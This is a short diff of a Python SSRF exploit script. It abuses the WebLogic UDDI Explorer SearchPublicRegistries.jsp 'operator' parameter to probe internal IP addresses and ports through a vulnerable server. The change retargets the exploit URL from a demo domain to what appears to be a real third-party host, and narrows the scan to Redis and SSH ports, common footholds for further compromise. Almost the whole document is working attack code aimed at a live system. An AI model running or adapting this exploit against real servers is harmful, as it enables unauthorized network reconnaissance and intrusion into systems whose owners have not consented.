@@ -6,9 +6,9 @@ import time
 import thread
 import requests
 def scan(ip_str):
-  ports = ('21','22','23','53','80','135','139','443','445','1080','1433','6379','3306','3389','8080','7001','8000',)
+  ports = ('6379','22')
   for port in ports:
-    exp_url = "http://weblogic.0day5.com/uddiexplorer/SearchPublicRegistries.jsp?operator=http://%s:%s&rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search"%(ip_str,port)
+    exp_url = "http://bbs2.doone.com.cn:8003/uddiexplorer/SearchPublicRegistries.jsp?operator=http://%s:%s&rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search"%(ip_str,port)
     try:
       response = requests.get(exp_url, timeout=15, verify=False)
       #SSRF判断
